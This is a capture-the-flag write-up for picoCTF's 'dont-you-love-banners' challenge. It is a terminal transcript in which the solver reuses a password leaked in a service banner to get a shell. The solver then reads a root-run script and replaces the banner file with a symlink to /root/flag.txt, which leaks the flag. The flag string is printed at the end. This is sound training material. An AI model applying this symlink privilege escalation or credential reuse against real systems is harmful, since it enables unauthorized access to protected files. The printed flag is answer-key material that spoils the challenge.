
# Reto 
### dont-you-love-banners
## Descripcion
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 57857`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 63613`. From the above information abuse the machine and find the flag in the /root directory.
## Solucion
```
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 63613
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
Jonh Draper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
Captain Crunch
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
John Draper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls /root
ls /root
flag.txt  script.py
player@challenge:~$ cat flag.txt
cat flag.txt
cat: flag.txt: No such file or directory
player@challenge:~$ cat /root/flag.txt
cat /root/flag.txt
cat: /root/flag.txt: Permission denied
player@challenge:~$ sudo cat /root/flag.txt
sudo cat /root/flag.txt
-su: sudo: command not found
player@challenge:~$ sudo -l
sudo -l
-su: sudo: command not found
player@challenge:~$ su root
su root
Password: My_Passw@rd_@1234

su: Authentication failure
player@challenge:~$ su root
su root
Password: My_Passw@rd_@1234    

su: Authentication failure
player@challenge:~$ ┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 57857
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
(kali㉿kali)-[~]
-su: syntax error near unexpected token `-[~]'
player@challenge:~$ $ nc tethys.picoctf.net 57857
-su: $: command not found
player@challenge:~$ SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
-su: SSH-2.0-OpenSSH_7.6p1: command not found
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar  9  2024 .
drwxr-xr-x 1 root root   29 Mar 25 23:00 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ exit
exit
logout

┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 57857
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
                                                                            
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 63613
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}

```
## Notas adicionales 

## Referencias


